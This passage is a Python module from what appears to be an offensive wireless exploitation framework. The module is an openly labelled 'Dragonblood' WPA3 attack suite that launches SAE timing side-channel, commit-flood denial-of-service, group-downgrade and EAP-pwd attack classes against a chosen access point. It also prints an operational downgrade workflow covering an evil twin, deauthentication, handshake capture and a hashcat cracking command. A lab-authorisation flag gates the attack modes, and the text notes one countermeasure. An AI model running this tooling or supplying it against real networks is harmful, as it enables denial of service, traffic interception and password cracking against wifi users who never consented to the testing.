            "Mathy Vanhoef, Eyal Ronen (Dragonblood research, 2019)",
        ),
        "references": (
            "https://wpa3.mathyvanhoef.com/",
            "https://papers.mathyvanhoef.com/dragonblood.pdf",
            "https://www.kb.cert.org/vuls/id/871675",
            "CVE-2019-9494",
            "CVE-2019-9495",
            "CVE-2019-9497",
            "CVE-2019-9498",
            "CVE-2019-9499",
            "CVE-2019-13377",
            "CVE-2019-13456",
        ),
        "devices": ("wifi", "802.11 WPA3-SAE", "802.11 WPA3-Enterprise"),
    }

    mode = OptString(
        "info",
        "Mode: info, timing, force, drain, slayer, downgrade_info",
    )
    interface = OptString("", "Monitor mode wireless interface (e.g. wlan0mon)")
    target_ap = OptString("", "Target AP BSSID (e.g. AA:BB:CC:DD:EE:FF)")
    group = OptInteger(19, "SAE group ID for drain mode (default 19 = P-256)")
    timing_samples = OptInteger(
        100, "SAE commit-confirm pairs to collect (timing mode)"
    )
    eap_samples = OptInteger(30, "EAP-pwd timing samples to collect (slayer mode)")
    eap_username = OptString("admin", "EAP identity for slayer mode")
    frame_count = OptInteger(
        500, "Frames to send: 0=continuous until Ctrl+C (drain/force modes)"
    )
    interval = OptFloat(0.0, "Seconds between frames, 0.0 = max speed")
    output_dir = OptString("", "Directory for result JSON files (default: .tmp/)")
    verbose = OptBool(False, "Per-frame output in drain mode")
    dry_run = OptBool(False, "Simulate without sending or sniffing")
    i_know_scope = OptBool(False, "Confirm authorized lab environment")

    def _validate_iface(self) -> bool:
        """Validate that interface option is set.

        Returns:
            True if interface is non-empty, False otherwise.
        """
        if not str(self.interface).strip():
            print_error("Set interface to a monitor-mode interface.")
            return False
        return True

    def _info(self) -> None:
        """Display Dragonblood CVE reference and native module overview."""
        print_info("Dragonblood WPA3-SAE Attack Suite (native)")
        print_info("=" * 55)
        print_info("")
        print_info(
            "CVE-2019-9494  SAE timing + cache side-channel - password partitioning"
        )
        print_info(
            "CVE-2019-9495  SAE commit flood - resource exhaustion (DoS)"
        )
        print_info(
            "CVE-2019-9496  SAE confirm missing state validation (crash)"
        )
        print_info(
            "CVE-2019-9497  EAP-pwd reflection attack (impersonate any user)"
        )
        print_info(
            "CVE-2019-9498  EAP-pwd invalid curve - server side (bypass auth)"
        )
        print_info(
            "CVE-2019-9499  EAP-pwd invalid curve - client side"
        )
        print_info(
            "CVE-2019-13377 Brainpool group timing side-channel"
        )
        print_info(
            "CVE-2019-13456 FreeRADIUS EAP-pwd information leak"
        )
        print_info(
            "CERT VU#871675 Transition mode downgrade + group downgrade"
        )
        print_info("")
        print_info("Native modes (no external binaries):")
        print_info("  info           - this reference screen")
        print_info(
            "  timing         - DragonTimingAttack: SAE commit-confirm "
            "timing side-channel (CVE-2019-9494)"
        )
        print_info(
            "  force          - DragonForce: SAE group downgrade probe "
            "(MODP group rejection -> WPA2 fallback)"
        )
        print_info(
            "  drain          - DragonDrain: SAE commit flood DoS "
            "(CVE-2019-9495)"
        )
        print_info(
            "  slayer         - DragonSlayer: EAP-pwd timing side-channel "
            "(CVE-2019-9499)"
        )
        print_info("  downgrade_info - WPA3 transition mode downgrade workflow")
        print_info("")
        scapy_ok = "available" if HAS_SCAPY else "NOT FOUND (pip install scapy)"
        numpy_ok = (
            "available"
            if HAS_NUMPY
            else "not found (pip install numpy - recommended)"
        )
        print_info(f"  Scapy  : {scapy_ok}")
        print_info(f"  numpy  : {numpy_ok}")

    def _downgrade_info(self) -> None:
        """Display WPA3 transition-mode downgrade attack workflow."""
        print_info("WPA3 Transition Mode Downgrade Attack")
        print_info("=" * 50)
        print_info("")
        print_info(
            "When WPA3-Transition is enabled (WPA2+WPA3 mixed mode):"
        )
        print_info("1. Create evil twin AP with same SSID but WPA2-only config")
        print_info("2. Deauthenticate client from legitimate WPA3 AP")
        print_info("3. Client reconnects to evil twin using WPA2")
        print_info("4. Capture WPA2 4-way handshake")
        print_info("5. Crack offline: hashcat -m 22000 capture.hc22000 wordlist")
        print_info("")
        print_info("Workflow in WXF:")
        print_info("  1. use generic/wifi/evil_twin_advanced")
        print_info("     set mode wpa2_only_clone")
        print_info("  2. use generic/wifi/pmkid_autopwn")
        print_info("     set mode crack")
        print_info("")
        print_info(
            "Countermeasure: disable WPA3 Transition mode (WPA3-only networks)."
        )

    def _run_timing(self) -> None:
        """Dispatch to DragonTimingAttack (CVE-2019-9494)."""
        if not self._validate_iface():
            return
        attack = DragonTimingAttack(
            interface=str(self.interface).strip(),
            bssid=str(self.target_ap).strip(),
            samples=int(self.timing_samples),
            dry_run=bool(self.dry_run),
            output_dir=str(self.output_dir).strip(),
        )
        attack.run()

    def _run_force(self) -> None:
        """Dispatch to DragonForce (SAE group downgrade probe)."""
        if not self._validate_iface():
            return
        count = int(self.frame_count) or 10
        attack = DragonForce(
            interface=str(self.interface).strip(),
            bssid=str(self.target_ap).strip(),
            count=count,
            interval=float(self.interval),
            dry_run=bool(self.dry_run),
        )
        attack.run()

    def _run_drain(self) -> None:
        """Dispatch to DragonDrain (CVE-2019-9495)."""
        if not self._validate_iface():
            return
        attack = DragonDrain(
            interface=str(self.interface).strip(),
            bssid=str(self.target_ap).strip(),
            frame_count=int(self.frame_count),
            interval=float(self.interval),
            group_id=int(self.group),
            dry_run=bool(self.dry_run),
            verbose=bool(self.verbose),
        )
        attack.run()

    def _run_slayer(self) -> None:
        """Dispatch to DragonSlayer (CVE-2019-9499)."""
        if not self._validate_iface():
            return
        attack = DragonSlayer(
            interface=str(self.interface).strip(),
            bssid=str(self.target_ap).strip(),
            username=str(self.eap_username).strip(),
            samples=int(self.eap_samples),
            dry_run=bool(self.dry_run),
            output_dir=str(self.output_dir).strip(),
        )
        attack.run()

    def check(self) -> str:
        """Verify the wireless interface is in monitor mode and accessible."""
        import shutil
        import subprocess

        iface = str(self.interface).strip() or "wlan0"
        if shutil.which("iwconfig"):
            try:
                out = subprocess.check_output(
                    ["iwconfig", iface],
                    stderr=subprocess.STDOUT,
                    timeout=5,
                ).decode("utf-8", "replace")
                if "Monitor" in out:
                    return f"Interface {iface} is in Monitor mode - prerequisites OK"
                if "no wireless extensions" not in out.lower():
                    return (
                        f"Interface {iface} found but NOT in Monitor mode - "
                        f"run: airmon-ng start {iface}"
                    )
            except (
                subprocess.CalledProcessError,
                FileNotFoundError,
                subprocess.TimeoutExpired,
            ):
                pass
        if shutil.which("iw"):
            try:
                out = subprocess.check_output(
                    ["iw", "dev"],
                    stderr=subprocess.STDOUT,
                    timeout=5,
                ).decode("utf-8", "replace")
                if iface in out:
                    return (
                        f"Interface {iface} detected via iw - verify monitor mode"
                    )
            except Exception:
                pass
        return (
            f"Interface {iface} not found - "
            "connect wireless adapter and enable monitor mode"
        )

    def run(self) -> None:
        """Dispatch to the selected attack mode."""
        op = str(self.mode).strip().lower()

        if op == "info":
            self._info()
            return
        if op == "downgrade_info":
            self._downgrade_info()
            return

        if not bool(self.i_know_scope):
            print_error("Set i_know_scope = true to confirm authorized lab.")
            return
        require_authorised_lab()

        print_success("Pre-conditions satisfied; launching exploit")
        self._exploit()

    def _exploit(self) -> None:
        """E2E exploit: dispatch chosen Dragonblood WPA3 attack variant."""
        op = str(self.mode).strip().lower()
        dispatch = {
            "timing": self._run_timing,
            "force": self._run_force,
            "drain": self._run_drain,
            "slayer": self._run_slayer,
        }

        handler = dispatch.get(op)
        if not handler:
            print_error(
                f"Unknown mode: {op}. "
                f"Valid modes: {', '.join(sorted(dispatch.keys()))}"
            )
            return
        handler()


# Public alias so `from wirelessxpl.modules.generic.wifi import DragonbloodSuite` works.
DragonbloodSuite = Exploit
